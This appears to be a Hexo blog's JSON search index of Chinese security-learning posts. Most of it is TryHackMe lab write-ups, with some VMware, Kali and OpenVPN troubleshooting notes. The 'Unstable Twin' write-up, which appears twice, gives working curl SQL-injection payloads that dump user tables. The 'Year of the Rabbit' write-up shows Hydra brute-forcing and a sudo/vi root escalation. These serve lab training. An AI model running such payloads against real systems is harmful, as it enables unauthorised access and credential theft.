O\n⌘ + O\n支持批量选择多个文档同时打开\n\n\n保存文档\nCtrl + S\n⌘ + S\n自动保存为 .md 格式，建议定期保存\n\n\n另存为\nCtrl + Shift + S\n⌘ + Shift + S\n可修改文件名、保存路径或格式（如 PDF）\n\n\n打开最近文件\nCtrl + Shift + O\n⌘ + Shift + O\n显示最近编辑的文档列表，快速恢复\n\n\n关闭文档\nCtrl + W\n⌘ + W\n未保存时会提示是否保存\n\n\n退出 Typora\nAlt + F4\n⌘ + Q\n关闭所有文档并退出程序\n\n\n八、查找与跳转快捷键\n\n\n功能\nWindows&#x2F;Linux\nMac\n补充说明\n\n\n\n文本查找\nCtrl + F\n⌘ + F\n支持大小写敏感、全字匹配，按 Enter 跳转下一个\n\n\n文本替换\nCtrl + H\n⌘ + Option + F\n可批量替换文本，支持预览替换结果\n\n\n跳转文档开头\nCtrl + Home\n⌘ + ↑\n快速回到文档第一行\n\n\n跳转文档结尾\nCtrl + End\n⌘ + ↓\n快速定位到文档最后一行\n\n\n跳转指定标题\n大纲面板点击\n大纲面板点击\n在大纲面板中点击标题，直接跳转至对应位置\n\n\n九、使用技巧与注意事项1. 快捷键冲突解决\n若快捷键无效，可能与系统 &#x2F; 其他软件冲突（如 Ctrl + Shift + K 可能被浏览器占用）：\n\n\n\n打开 Typora → 点击「文件」→「偏好设置」→「快捷键」；\n\n\n\n在搜索框输入目标功能（如 “代码块”），点击右侧 “修改” 自定义快捷键。\n\n\n\n2. 手动触发语法补充部分功能无需快捷键，输入特定符号后按 空格 即可触发：\n\n无序列表：输入 - &#x2F; * &#x2F; + + 空格；\n\n有序列表：输入 数字. + 空格（如 1. ）；\n\n块引用：输入 &gt; + 空格；\n\n代码块：输入 + 空格 + 语言名（如python）+ 回车。\n\n\n","categories":["疑难杂症"],"tags":["网络安全","学习笔记","web安全"]},{"title":"Unstable Twin-cnblog","url":"/2025/09/16/Unstable%20Twin-cnblog/","content":"﻿# Unstable Twin\n一、信息收集使用nmap对网站ip的开放端口进行扫描\nnmap -sS -sV -A  -Pn 10.10.187.113 \n\n\n开放了22端口和80端口\n使用dirsearch扫描一下看看还有没有其他目录\ndirsearch -u http://10.10.187.113  -e php,html,txt -t 100\n\n\n这里我访问网站网站显示一片空白课，我以为是我哪里出错，后面看了wp发现这里要对API的目录进行爆破\ndirsearch -u http://10.10.187.113/api  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 100 \n\n发现在api下面有个登录页面 login 但该 URL 不允许你当前使用的 HTTP 方法。\nHTTP方法不对\n\n默认浏览器使用 GET 请求\n\n但是接口只允许 POST，所以返回 405 Method Not Allowed\n\n\nAPI 不是普通网页\n\n你访问的是一个 RESTful API 接口，不是 HTML 登录页面\n浏览器直接访问通常会报错，而 curl 可以用 -X POST 正确调用接口\n\n\n这里我们使用curl看看服务器响应\n\ncurl 是一个非常常用的命令行工具，用于在终端或脚本中发送 HTTP&#x2F;HTTPS 请求以及其他协议请求（FTP、SMTP、SFTP 等），并获取服务器响应。\n\ncurl -v http://10.10.187.113/info\n\n这里我发现一半时间我们的版本是 1.3.4-dev ，一半时间我们的 版本是1.3.6-final ，服务器名称是也是一样 Vincent 和 Julias \n\n二、渗透利用我们尝试对login用弱口令登录一下\n\n我们将POST 数据格式传输的命令格式改为json格式\ncurl -v -X POST &#x27;http://10.10.187.113/api/login&#x27;  -d &#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;&#x27;\n\n\n成功与服务器获得交互，并且报错了，我，们看看这里数据库有没有sql注入\ncurl  -X POST &#x27;http://10.10.213.54/api/login&#x27;  -d &#123;&quot;username&quot;:&quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1&quot;,&quot;password&quot;:&quot;x&quot;&#125; \n\n这里发现一个很有意思的情况，我输入命令的时候一半是有结果的一半是没有结果的，可能跟前面服务器不同有关系\n\n这当我们输入测试语句后也是成功和数据库进行交互了 这样我们可以在这里进行手工测试发现数据库了是SQLite的\ncurl -X POST &#x27;http://10.10.213.54/api/login&#x27;  -d &quot;username=admin&amp;password=admin&#x27;UNION SELECT 1,sqlite_version()--&quot;\n\n在SQLite里面没有database的概念只有文件名，我们直接查表名就行了\n获取所有表名（拼接成一行）\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\                                                        ✔   -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(name,&#x27;,&#x27;) FROM sqlite_master WHERE type=&#x27;table&#x27;)--&amp;password=x&quot;\n\n\n获取列名\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(name,&#x27;,&#x27;) FROM pragma_table_info(&#x27;users&#x27;))--&amp;password=x&quot;\n\n\n获取用户&#x2F;密码\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(username||&#x27;:&#x27;||password,&#x27;,&#x27;) FROM users)--&amp;password=x&quot;\n\n\n刚刚在看表名的时候还有一个notes的表看看里面有什么东西\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\                                                        ✔   -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(name,&#x27;,&#x27;) FROM pragma_table_info(&#x27;notes&#x27;))--&amp;password=x&quot;\n\n\n查询密码\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\                                                        ✔   -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(user_id||&#x27;:&#x27;||note_sql||&#x27;:&#x27;||notes,&#x27;,&#x27;) FROM notes)--&amp;password=x&quot;\n\n\n三、哈希爆破这里给了一段密码\neaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n\n这里我们使用haiti识别一下这段密码\n\n发现这里是用SHA512加密过多 我们使用hashcat对这段密文进行爆破\n\n得到破译后的密码 experiment\n\n我们使用ssh登录，mary_ann 因为上面测试出来只有这个用户的密码没有出来\n\n拿到user.flag\n\n四、隐写术这里给了我们一段提示已经找到了靶场里的 notes 表或笔记信息你需要获取每个人的图片（image）除了找到所有家人的图片，还要找到自己的图片我们需要找到这些图片 看了太麻烦了看了一眼wp 这些图片藏在&#x2F;opt下面\n\n这我看了wp 反正我使用scp打包文件再使用kali下载 和开启http服务都不能下载图片 在wp里面写着还有一个隐藏的目录&#x2F;get_image 可以通过字典扫描出来，我们通过这个目录下载这些图片\nnames=(&quot;Arnold-Schwarzenegger&quot; &quot;Danny-DeVito&quot; &quot;Bonnie-Bartlett&quot; &quot;Kelly-Preston&quot; &quot;Chloe-Webb&quot;)for name in &quot;$&#123;names[@]&#125;&quot;; do    curl -o &quot;$&#123;name&#125;.jpg&quot; &quot;http://10.10.213.54/get_image?name=$&#123;name&#125;&quot; done\n\n\n如果这个用不了就老实一个一个下载吧\nwget http://10.10.213.54/get_image\\?name\\=mary_ann wget http://10.10.213.54/get_image\\?name\\=juliaswget http://10.10.213.54/get_image\\?name\\=linda         wget http://10.10.213.54/get_image\\?name\\=marnie  wget http://10.10.213.54/get_image\\?name\\=vincent \n\n\n\n我们使用setghide对里面的文件逐一提取\n\n\n在数据库注入那会每个姓名对应一种颜色 这里提示让我们根据彩虹颜色顺序来进行排列\n\nRed - 1DVsdb2uEE0k5HK4GAIZOrange - PS0Mby2jomUKLjvQ4OSwYellow - jKLNAAeCdl2J8BCRuXVXGreen - eVYvs6J6HKpZWPG8pfeHoNG1 组合一下就是：1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSwjKLNAAeCdl2J8BCRuXVXeVYvs6J6HKpZWPG8pfeHoNG1 \n\n\n这是一段base62编码 拿去厨房解码一下https://gchq.github.io/CyberChef\n\n最后：不知道是我的问题还是这个靶场的问题 这个靶场的wp我写了很久，有很多奇怪的问题太难受了\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"Unstable Twin","url":"/2025/09/16/Unstable%20Twin/","content":"Unstable Twin一、信息收集使用nmap对网站ip的开放端口进行扫描\nnmap -sS -sV -A  -Pn 10.10.187.113 \n\n\n开放了22端口和80端口\n使用dirsearch扫描一下看看还有没有其他目录\ndirsearch -u http://10.10.187.113  -e php,html,txt -t 100\n\n\n这里我访问网站网站显示一片空白课，我以为是我哪里出错，后面看了wp发现这里要对API的目录进行爆破\ndirsearch -u http://10.10.187.113/api  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -t 100 \n\n发现在api下面有个登录页面 login 但该 URL 不允许你当前使用的 HTTP 方法。\nHTTP方法不对\n\n默认浏览器使用 GET 请求\n\n但是接口只允许 POST，所以返回 405 Method Not Allowed\n\n\nAPI 不是普通网页\n\n你访问的是一个 RESTful API 接口，不是 HTML 登录页面\n浏览器直接访问通常会报错，而 curl 可以用 -X POST 正确调用接口\n\n\n这里我们使用curl看看服务器响应\n\ncurl 是一个非常常用的命令行工具，用于在终端或脚本中发送 HTTP&#x2F;HTTPS 请求以及其他协议请求（FTP、SMTP、SFTP 等），并获取服务器响应。\n\ncurl -v http://10.10.187.113/info\n\n这里我发现一半时间我们的版本是 1.3.4-dev ，一半时间我们的 版本是1.3.6-final ，服务器名称是也是一样 Vincent 和 Julias \n\n二、渗透利用我们尝试对login用弱口令登录一下\n\n我们将POST 数据格式传输的命令格式改为json格式\ncurl -v -X POST &#x27;http://10.10.187.113/api/login&#x27;  -d &#x27;&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;&#125;&#x27;\n\n\n成功与服务器获得交互，并且报错了，我，们看看这里数据库有没有sql注入\ncurl  -X POST &#x27;http://10.10.213.54/api/login&#x27;  -d &#123;&quot;username&quot;:&quot;admin&#x27; OR &#x27;1&#x27;=&#x27;1&quot;,&quot;password&quot;:&quot;x&quot;&#125; \n\n这里发现一个很有意思的情况，我输入命令的时候一半是有结果的一半是没有结果的，可能跟前面服务器不同有关系\n\n这当我们输入测试语句后也是成功和数据库进行交互了 这样我们可以在这里进行手工测试发现数据库了是SQLite的\ncurl -X POST &#x27;http://10.10.213.54/api/login&#x27;  -d &quot;username=admin&amp;password=admin&#x27;UNION SELECT 1,sqlite_version()--&quot;\n\n在SQLite里面没有database的概念只有文件名，我们直接查表名就行了\n获取所有表名（拼接成一行）\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\                                                        ✔   -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(name,&#x27;,&#x27;) FROM sqlite_master WHERE type=&#x27;table&#x27;)--&amp;password=x&quot;\n\n\n获取列名\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(name,&#x27;,&#x27;) FROM pragma_table_info(&#x27;users&#x27;))--&amp;password=x&quot;\n\n\n获取用户&#x2F;密码\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(username||&#x27;:&#x27;||password,&#x27;,&#x27;) FROM users)--&amp;password=x&quot;\n\n\n刚刚在看表名的时候还有一个notes的表看看里面有什么东西\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\                                                        ✔   -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(name,&#x27;,&#x27;) FROM pragma_table_info(&#x27;notes&#x27;))--&amp;password=x&quot;\n\n\n查询密码\ncurl -i -X POST &#x27;http://10.10.213.54/api/login&#x27; \\                                                        ✔   -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \\  --data &quot;username=admin&#x27; UNION SELECT 1,(SELECT group_concat(user_id||&#x27;:&#x27;||note_sql||&#x27;:&#x27;||notes,&#x27;,&#x27;) FROM notes)--&amp;password=x&quot;\n\n\n三、哈希爆破这里给了一段密码\neaf0651dabef9c7de8a70843030924d335a2a8ff5fd1b13c4cb099e66efe25ecaa607c4b7dd99c43b0c01af669c90fd6a14933422cf984324f645b84427343f4\n\n这里我们使用haiti识别一下这段密码\n\n发现这里是用SHA512加密过多 我们使用hashcat对这段密文进行爆破\n\n得到破译后的密码 experiment\n\n我们使用ssh登录，mary_ann 因为上面测试出来只有这个用户的密码没有出来\n\n拿到user.flag\n\n四、隐写术这里给了我们一段提示已经找到了靶场里的 notes 表或笔记信息你需要获取每个人的图片（image）除了找到所有家人的图片，还要找到自己的图片我们需要找到这些图片 看了太麻烦了看了一眼wp 这些图片藏在&#x2F;opt下面\n\n这我看了wp 反正我使用scp打包文件再使用kali下载 和开启http服务都不能下载图片 在wp里面写着还有一个隐藏的目录&#x2F;get_image 可以通过字典扫描出来，我们通过这个目录下载这些图片\nnames=(&quot;Arnold-Schwarzenegger&quot; &quot;Danny-DeVito&quot; &quot;Bonnie-Bartlett&quot; &quot;Kelly-Preston&quot; &quot;Chloe-Webb&quot;)for name in &quot;$&#123;names[@]&#125;&quot;; do    curl -o &quot;$&#123;name&#125;.jpg&quot; &quot;http://10.10.213.54/get_image?name=$&#123;name&#125;&quot; done\n\n\n如果这个用不了就老实一个一个下载吧\nwget http://10.10.213.54/get_image\\?name\\=mary_ann wget http://10.10.213.54/get_image\\?name\\=juliaswget http://10.10.213.54/get_image\\?name\\=linda         wget http://10.10.213.54/get_image\\?name\\=marnie  wget http://10.10.213.54/get_image\\?name\\=vincent \n\n\n\n我们使用setghide对里面的文件逐一提取\n\n\n在数据库注入那会每个姓名对应一种颜色 这里提示让我们根据彩虹颜色顺序来进行排列\n\nRed - 1DVsdb2uEE0k5HK4GAIZOrange - PS0Mby2jomUKLjvQ4OSwYellow - jKLNAAeCdl2J8BCRuXVXGreen - eVYvs6J6HKpZWPG8pfeHoNG1 组合一下就是：1DVsdb2uEE0k5HK4GAIZPS0Mby2jomUKLjvQ4OSwjKLNAAeCdl2J8BCRuXVXeVYvs6J6HKpZWPG8pfeHoNG1 \n\n\n这是一段base62编码 拿去厨房解码一下https://gchq.github.io/CyberChef\n\n最后：不知道是我的问题还是这个靶场的问题 这个靶场的wp我写了很久，有很多奇怪的问题太难受了\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"VMware Workstation 不可恢复错误(vmui)Exception 0xc0000094 has occurred.日志文件位于CUsersxxxAppDataLocalTempvmware-xxxvmwar","url":"/2025/09/16/VMware%20Workstation%20%E4%B8%8D%E5%8F%AF%E6%81%A2%E5%A4%8D%E9%94%99%E8%AF%AF(vmui)Exception%200xc0000094%20has%20occurred.%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E4%BD%8D%E4%BA%8ECUsersxxxAppDataLocalTempvmware-xxxvmwar/","content":"VMware Workstation 不可恢复错误:(vmui)Exception 0xc0000094 has occurred.日志文件位于”C:\\Users\\xxx\\AppData\\Local\\Temp\\vmware-xxxvmware-ui-21724.10g“中。您可以请求支持。今天搭建DC靶场，当我把靶场导入虚拟机编辑虚拟机设置的时候给我报错了\n\n\n将报错信息复制下来拿去网上搜索了一下\n\n\n在使用 VMware Workstation 时，如果遇到“不可恢复错误 (vmui)”的提示，通常是由于软件版本或硬件兼容性问题引起的。\n\n可能是兼容性引起的，这里看了几篇文章，通过这篇文章解决了\nhttps://blog.csdn.net/u011696928/article/details/128712049\n【解决方法】由于搭建的虚拟机环境一直在使用，后来发现是VMware升级到17.0后，并且将虚拟机环境的【硬件兼容性】升级至Workstation 17.X后，无法修改设备参数。进而将【硬件兼容性】版本降级。修改步骤：打开需要修改设备参数的虚拟机后，依次点击【虚拟机】-【管理】-【更改硬件兼容性】\n\n将兼容性进行降级\n\n【硬件兼容性】修改后就可以编辑虚拟机了\n\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"Windows and AD Fundamentals","url":"/2025/09/16/Windows%20and%20AD%20Fundamentals/","content":"OWASP Juice Shop问题1：管理员的电子邮件地址是什么？","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"Year of the Rabbit – TryHackMe","url":"/2025/09/16/Year%20of%20the%20Rabbit%20%E2%80%93%20TryHackMe/","content":"Year of the Rabbit – TryHackMe一、信息收集\n使用nmap对ip端口进行一个扫描看看开放了哪些服务，这个靶场开起来了ftp ssh和http\n\n\n\n再使用dirsearch对靶场进行扫描一下，有个assets目录\n\n\n二、渗透利用\n访问一下这个网站\n\n\n\n访问一下目录，有个目录遍历看一下这个mp4是什么\n\n\n\nWC给诈骗了😅\n\n\n\n看看另外一个css文件里面，泄露了一个路径访问看看\n\n\n\n给了我们一个提示，叫我们关闭js，\n\n\n\n然后点击确定之后给了我们一个视频，然后，然后就又给咋骗了\n\n\n\n我们关闭这个js再访问一下，我这里使用firefox浏览器，在搜索框里面输入about:config就能修改，将true改为false就行了，后面记得改回来\n\n\n\n再回去访问一下那个路径，给了我们一段提示…..叫我们音量提高，意思是还得看这个视频呗\n\n\n\n\n在音频的第56秒有一个提示，这里提到了burp，看来要抓包了\n\n\n“I’ll put you out of your misery burp you’re looking in the wrong place”\n\n\n打开bup访问&#x2F;sup3r_s3cr3t_fl4g.php，可以到我在放行的过程中给了重定向停在了名为 /intermediary.php 的页面上，并带有 hidden_directory 参数，我们现在访问一下这个&#x2F;WExYY2Cv-qU 页面看看\n\n\n\n在这个隐藏的文件下面有一个图片\n\n\n\n点进去看一下这是经常被用作处理技术测试图像的经典 Lena 图片\n\n\n\n看了一下攻略，这里先把文件下载下来，然后使用\n\n\n三、内网渗透\n使用命令,看到\n\nsed -n &#x27;1790,1791p&#x27; Hot_Babe.png\n\n\n\n使用翻译软件看了一下得到了一个用户名ftpuser\n\n\n\n使用cat命令查看这个图片，在这个图片的末尾阶段给了我们一串密码\n\n\n\n我们将这个词表保存到一个新文件中，然后我们可以将 Hydra 设置在 FTP 服务器\n\nsed -n &#x27;1792,$p&#x27; Hot_Babe.png &gt; wordlist.txt\n\n\n\n\n使用 Hydra对我们得到的用户的密码进行爆破，成功拿到了密码5iez1wGXKfPKQ，现在进行登录\n\nhydra -l ftpuser -P &lt;path-to-copied-wordlist&gt; &lt;remote-ip&gt; ftp\n\n\n\n在ftp下面只有一个文件，我们下载看看里面有什么\n\n\n\n看了一下文件，感觉有点像fuckjs拿去解密一下，发现解密不出来，搜了一下发现这个brainfuck，\n\n\n\n继续解密吧，丢网站上解密了一下拿到了一个用户和密码,应该是ssh的登录看看\n\nUser: eliPassword: DSpDiM1wAEwid\n\n\n\n也是成功的登录上去了这里又给了我们一段提示\n\n\n\n隔这偷情呢\n\n\n\n我们直接搜索user.txt 发现他在gwendoline下面杀过去\n\n\n\n然后直接就把我关在门外了，显示我没有权限进去\n\n‘’\n\n我们再根据那个暗语搜索一下s3cr3t,果真找到了\n\n\n\n看看这个目录下面有什么\n\n\n\n这个下面有个隐藏文件看看里面是什么，里面有Gwendoline的密码MniVCQVhQHUNI 我们切换用户登录去拿user.txt\n\n\n四、提权\n也是成功拿到了uiser.txt了，接下来就要去拿根目录的flag了，这里先sudo -l看一下当前用户有没有以root权限运行的命，\n\n\n\n可以看到这里vi是以root权限运行的\n\n\n\n我们先使用sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt通过 vi 打开 &#x2F;home&#x2F;gwendoline&#x2F;user.txt 的上下文,然后在vi中使用命令 !bash\n\n后返回终端就能是root用户了\n\n\n现在我们只需要获取 /root/root.txt\n\n\n\n","categories":["TryHackMe"],"tags":["渗透测试","Web安全","网络安全","学习笔记"]},{"title":"kali linux 2024.1定制魔改版 桌面工具箱无法启动","url":"/2025/09/16/kali%20linux%202024.1%E5%AE%9A%E5%88%B6%E9%AD%94%E6%94%B9%E7%89%88%20%E6%A1%8C%E9%9D%A2%E5%B7%A5%E5%85%B7%E7%AE%B1%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8/","content":"Kali Linux 定制化魔改 添加常见60渗透工具 桌面工具箱无法启动我在使用这个kali定制魔改版的时候打开桌面工具箱无法打开于是开启了我艰辛的修改之路\n项目地址:https://blog.csdn.net/qq_41860876/article/details/141320430\n我在启动这个工具箱的时候发现点击会无法启动\n\n然后我修改了里面的启动文件内容，直接复制粘贴过去就行了\n[Desktop Entry]Comment=启动 start.shExec=/home/zss/.storage/start.shIcon=/home/zss/图片/avatar.pngName=zssNoDisplay=falsePath=/home/zss/.storageStartupNotify=trueTerminal=trueTerminalOptions=Type=ApplicationX-KDE-SubstituteUID=falseX-KDE-Username=\n\n\n修改完之后还是无法打开显示没有Python 模块 ttkbootstrap 没有安装 有关\n\n创建虚拟环境（推荐）\ncd /home/zss/.storagepython3 -m venv venv      # 创建虚拟环境source venv/bin/activate  # 激活虚拟环境pip install --upgrade pippip install ttkbootstrap  # 安装依赖\n\n修改 start.sh 让它在虚拟环境里运行\n#!/bin/bashsource /home/zss/.storage/venv/bin/activatepython run.py\n\n这样点击桌面图标就能运行，不会报找不到模块。\n不出意外就要出意外了 在.storage文件下面的run.py文件报错\n/home/zss/.storage/run.py:1082: SyntaxWarning: invalid escape sequence &#x27;\\O&#x27;/home/zss/.storage/run.py:1215: SyntaxWarning: invalid escape sequence &#x27;\\A&#x27;\n\n这是 Python 对 字符串里的反斜杠 报警告。\n原因：Python 里 \\O、\\A 不是合法转义字符\n\n\n在字符串前加 r，Python 就不会把 \\ 当作转义符。\n每个 \\ 都要写成 \\\\。\n然后差不多桌面工具箱就能重新启动了，希望对你有帮助\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"kali 配置openvpn连接tryhackme失败（已解决）","url":"/2025/09/16/kali%20%E9%85%8D%E7%BD%AEopenvpn%E8%BF%9E%E6%8E%A5tryhackme%E5%A4%B1%E8%B4%A5%EF%BC%88%E5%B7%B2%E8%A7%A3%E5%86%B3%EF%BC%89/","content":"kali 配置openvpn连接tryhackme失败（已解决）最近准备使用tryhackme来学一下ctf我使用kali一直配置不上，于是无去网上看了很资料和问了很多ai终于解决了问题\n我目前使用openvpn连接报错是TLS链接超时\nTLS Error: TLS key negotiation failed to occur within 60 seconds (check your network connectivity)2025-09-02 16:50:50 TLS Error: TLS handshake failed\n\n去网上找资料，在这个博主这里一次Kali连接Tryhackme的经历我看到了一款工具是专门用于在 Linux 上使用 OpenVPN 对 TryHackMe 网络的连接进行故障排除的脚本\n\n项目地址:https://github.com/tryhackme/openvpn-troubleshooting/\n\n我跟他的环境一样是使用vmware上的kali进连接，使用命令检查结果如下\n\n丢到ai问了一下告诉我OpenVPN 没有成功建立虚拟网卡 tun0\n[-] tun0 interface does not exist[-] Failed to connect\n\n可以根据ai给我的回答先排查一下kali上的配置问题\n\nTUN 模块未启用\n\n检查：ls /dev/net/tun如果没有，加载：sudo modprobe tun\n\n\n时间不对导致 TLS 握手失败\n\n检查时间：date如果不对，开 NTP 自动校时：sudo timedatectl set-ntp true\n\n如果尝试了上面的操作用root权限运行一下.open文件，再使用ip addr show tun0可以看一下tun0是否成功创建，如果没有我们进行下一步操作\n因为我是用kali虚拟机配置物理机的clash verg代理，所以我要让我的.open文件走我物理机上的Clash Verge 的代理端口进行流量转发。我看了这篇文章后发现在kali下用openvpn连接tryhackme第一次在国内想要使用tryhackme的openvpn是需要开梯子的，而且它的ovpn文件只支持udp连接。就很操蛋，继续配置吧\n打开clash verg，点击订阅，右键编辑文件\n然后添加上了配置规则\nudp: trueudp-port: 7890  allow-lan:true\n\n\n这里allow-lan：设置为true\n默认情况下，Clash 只监听 127.0.0.1 (本机回环地址)，也就是说只有你这台机器可以用它的代理端口。\n因为我的虚拟机使用的是桥接模式所以当 allow-lan: true 时，Clash 会把代理端口开放到本机局域网 IP（例如 192.168.x.x），这样同一个局域网里的其他设备也可以通过你电脑的 Clash 来走代理\n\n\n接着我在物理机上登录tryhackme官网下载了linux的配置文件上传到kali，然后用nano进行修改.open配置文件\n添加代理规则，保存\nsocks-porxy 192.168.1.102 7897\n\n\n\n注意：这里不是127.0.0.1，这里应该为你物理机的ip地址，clash verg里面 mixed-port（混合端口，支持 HTTP + SOCKS5，一般默认 7890）在这里我是7897，可以在设置里面看到\n\n接着配置完.open文件后运行看看能不能启动\n\n依旧是显示我报错，把报错内容丢到ai看一下是什么情况\nTCP/UDP: Preserving recently used remote address: [AF_INET]192.168.1.102:7897Attempting to establish TCP connection with [AF_INET]192.168.1.102:7897TCP connection established with [AF_INET]192.168.1.102:7897SOCKS proxy wants us to send UDP to [AF_INET]192.168.1.102:7897UDPv4 link remote: [AF_INET]3.7.33.194:1194\n\n\n你正在通过 SOCKS 代理（192.168.1.102:7897）连接 OpenVPN\n这个 192.168.1.102:7897 看起来是你本机 Clash Verge 的代理端口。\n日志显示 OpenVPN 并不是直连 TryHackMe，而是走代理。\n\n\n配置文件带了代理参数\n说明你下载的 liuyuanbiao1112.ovpn 里可能写了 socks-proxy 192.168.1.102 7897 这样的行。\n如果你本机代理没正确转发 UDP，tun0 就会创建失败。\n\n\n警告信息\nWARNING: Compression... → 只是安全提示，不影响连接。\nNote: --cipher is not set... → 也是兼容性提示，可以忽略。\n\n\n\n关键点来了如果你本机代理没正确转发 UDP，tun0 就会创建失败\n这里说明我的windows物理机上的clash verg代理配置还是有点问题，要确保 Clash 的 tun 模式 或 UDP 转发 已开启，否则 OpenVPN 只能建立 TCP 连接，不会创建 tun0\n在clash首页启动虚拟网卡模式（tun模式）\n\n第一次启动tun模式需要到设置里面安装，我这里安装好了\n\n然后再去运行一下.open文件显示连接成功\n查看tun0\nip addr show tun0\n\nPing tryhackme内网\nping -c 4 10.10.10.10\n\n（10.10.10.10 是 TryHackMe 的内网靶机测试地址）\n\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"windows 配置openvpn连接tryhackme失败（已解决）","url":"/2025/09/16/windows%20%E9%85%8D%E7%BD%AEopenvpn%E8%BF%9E%E6%8E%A5tryhackme%E5%A4%B1%E8%B4%A5%EF%BC%88%E5%B7%B2%E8%A7%A3%E5%86%B3%EF%BC%89/","content":"windows 配置openvpn连接tryhackme失败（已解决）我本来是用windows上面配置openvpn去访问tryhackme的然后失败了所以转战kali，现在kali配置成功了我就反推回来看看windows哪里配置出错，如果没有看我的kali配置openvpn连接tryhackme的可以先看一下\n\n链接：https://www.cnblogs.com/HalfwayMousie/p/19070459\n\n我的问题和在kali上的问题一样都是因为TLS超时导致的。\n我自己思考了一下，我对kali配置我对windows也使用过，相比我的windows上配置的不同点就是要使用tun模式和修改节点文件\n因为我前面在kali上面已经修改了我的节点配置文件，可以看上面那个链接\n于是我就打开了clash verg模式然后我的openvpn就成功链接上了，没想到这么简单我还弄了好久\n\n也是解决困扰我好几天的问题了很开心。\n","categories":["疑难杂症"],"tags":["故障排查","已解决","问题与复盘","学习问题"]},{"title":"今日问题与解决方案整理（Hexo Butterfly 主题博客搭建 + 网络安全笔记迁移）","url":"/2025/09/16/%E4%BB%8A%E6%97%A5%E9%97%AE%E9%A2%98%E4%B8%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%95%B4%E7%90%86%EF%BC%88Hexo%20Butterfly%20%E4%B8%BB%E9%A2%98%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%20+%20%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0%E8%BF%81%E7%A7%BB%EF%BC%89/","content":"今日问题与解决方案整理（Hexo Butterfly 主题博客搭建 + 网络安全笔记迁移）一、Markdown 笔记批量迁移到 Hexo1. 问题：本地笔记（D:\\Blog\\ 小迪学习笔记）迁移到 Hexo _posts 目录\n需求：批量迁移大量网络安全笔记，自动生成 Hexo 所需 Front-matter（避免手动修改），要求 title 用笔记文件名，categories&#x2F;tags 固定为网络安全相关分类。\n\n解决方案：使用 Python 迁移脚本（自动添加 Front-matter + 复制文件）：\n\n\nimport osfrom datetime import datetime# 配置路径（根据实际情况修改）src_dir = r&quot;D:\\Blog\\小迪学习笔记&quot;  # 本地笔记源目录dst_dir = r&quot;D:\\BlogFile\\source\\_posts&quot;  # Hexo 文章存储目录（_posts）# 若目标目录不存在，自动创建if not os.path.exists(dst_dir):    os.makedirs(dst_dir)# 遍历所有 Markdown 笔记for file in os.listdir(src_dir):    if file.endswith(&quot;.md&quot;):        src_path = os.path.join(src_dir, file)  # 原笔记路径        dst_path = os.path.join(dst_dir, file)  # 迁移后路径        # 读取原笔记内容        with open(src_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f:            content = f.read()        # 自动生成 Front-matter（适配 Butterfly 主题）        title = os.path.splitext(file)[0]  # 用文件名作为文章标题（去掉.md后缀）        date_str = datetime.now().strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)  # 生成当前时间作为发布时间        front_matter = f&quot;&quot;&quot;---updated: 2025-09-16 15:50:31title: &#123;title&#125;date: 2025-09-16 13:44:53categories:   - 你的种类tags:   - 文章标签---&quot;&quot;&quot;        # 将 Front-matter 与笔记内容合并，写入目标文件        with open(dst_path, 